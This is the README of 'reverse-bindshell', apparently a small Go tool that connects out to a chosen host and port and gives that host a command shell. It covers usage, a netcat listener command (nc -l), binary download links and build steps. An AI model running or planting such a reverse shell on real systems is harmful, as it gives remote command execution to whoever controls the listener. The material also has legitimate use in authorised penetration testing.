<h1 align="center">reverse-bindshell</h1>

<p align="center">
  Create a reverse bindshell: connect to a target host, providing it a shell.
</p>

<p align="center">
  <a href="https://travis-ci.org/darnould/reverse-bindshell" target="_blank"><img src="https://img.shields.io/travis/darnould/reverse-bindshell.svg?style=flat-square"></a>
</p>

## Usage
```
./reverse-bindshell host:port
```

Before running this, you'll want to be listening on the specified port on an accessible host.

Running `netcat` as following on that host should do the trick:
```
nc -l <port>
```

Now you can enter commands to remotely execute on the machine running `reverse-bindshell`.

## Binary Download
* [Linux](https://github.com/darnould/reverse-bindshell/releases/download/v1/reverse-bindshell_linux_amd64)
* [Mac](https://github.com/darnould/reverse-bindshell/releases/download/v1/reverse-bindshell_darwin_amd64)

## Building
A single `reverse-bindshell` executable will be produced.

### With Go installed
```
go build
```

### With Docker installed
```sh
docker run -v "$PWD":/go/src/github.com/darnould/reverse-bindshell -w /go/src/github.com/darnould/reverse-bindshell golang:1.3 go build
```

